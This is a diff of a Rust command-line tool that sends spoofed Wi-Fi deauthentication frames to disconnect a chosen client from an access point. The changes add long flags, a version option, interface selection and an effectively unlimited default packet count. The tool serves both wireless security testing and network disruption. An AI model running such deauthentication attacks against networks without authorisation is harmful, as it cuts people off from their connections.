@@ -53,16 +53,17 @@ fn create_packet(target_mac: Vec<u8> , source_mac: Vec<u8>) -> Vec<u8> {
     return packet;
 }
 
-fn print_help(prog_name: &String) {
+fn print_help(prog_name: &str) {
     println!("Usage: sudo {} [OPTIONS]", prog_name);
     println!();
     println!("Options:");
-    println!("  -t <target_mac>       Set the target MAC address (the one to be deauthenticated)");
-    println!("  -s <source_mac>       Set the source MAC address (usually the AP/router)");
-    //println!("  -i <interface>        Set the wireless interface in monitor mode (e.g., wlan0mon)");
-    println!("  --packets  <n>        Set the number of packets to be sent (e.g., 10)");
-    println!("  --interval <seconds>  Set the delay between each deauth packet (default: 1)");
-    println!("  -h, --help            Show this help message and exit");
+    println!("  -t, --target <target_mac>       Set the target MAC address (the one to be deauthenticated)");
+    println!("  -s, --source <source_mac>       Set the source MAC address (usually the AP/router)");
+    println!("  -i, --interface <interface>     Set the wireless interface in monitor mode (e.g., wlan0mon)");
+    println!("      --packets <n>               Set the number of packets to be sent (e.g., 10)");
+    println!("      --interval <seconds>        Set the delay between each deauth packet (default: 1)");
+    println!("  -h, --help                      Show this help message and exit");
+    println!("  -v, --version                   Shows the current version");
 }
 
 fn argparse(argv: &Vec<String>) -> Option<HashMap<&str, &String>> {
@@ -81,9 +82,13 @@ fn argparse(argv: &Vec<String>) -> Option<HashMap<&str, &String>> {
         }
 
         match j.as_str() {
-            "-t" => { _ = args.insert("-t", &argv[i + 1]); },
-            "-s" => { _ = args.insert("-s", &argv[i + 1]); },
-            "-i" => { _ = args.insert("-i", &argv[i + 1]); },
+            "-v" | "--version" => { 
+                println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
+                std::process::exit(0);
+            },
+            "-t" | "--target" => { _ = args.insert("-t", &argv[i + 1]); },
+            "-s" | "--source" => { _ = args.insert("-s", &argv[i + 1]); },
+            "-i" | "--interface" => { _ = args.insert("-i", &argv[i + 1]); },
             "--packets" => { _ = args.insert("--packets", &argv[i + 1]); },
             "--interval" => { args.insert("--interval", &argv[i + 1]); },
             _ => {},
@@ -121,23 +126,31 @@ fn main() {
         },
         None => panic!("[!] Please enter a target mac address"),
     };           
+    
+    let mut capture = match hashmap.get("-i") {
+        Some(dev) => Capture::from_device(dev.as_str())
+            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
+            .open()
+            .unwrap_or_else(|_| panic!("[!] This script requires root privilages")),
+
+        None => Capture::from_device(Device::lookup().unwrap().unwrap())
+            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
+            .open()
+            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
+
+    };
 
     let packet: Vec<u8> = create_packet(target_mac, source_mac);
     
-    let mut capture = Capture::from_device(Device::lookup().unwrap().unwrap())
-                            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
-                            .open()
-                            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"));
-
     let mut counter: i32 = 0;
     let pkt_cnt: i32 = match hashmap.get("--packets") {
         Some(x) => x.parse().expect("[!] Error parsing packet flag"),
-        None => 2147483647,
+        None => i32::MAX,
     };
 
     println!("[#] Deauthing {}", match hashmap.get("-t") { 
-                    Some(x) => x, 
-                    None => panic!("lol") 
+        Some(x) => x, 
+        None => panic!("Please Enter a target source mac address") 
     });
 
     while counter < pkt_cnt {
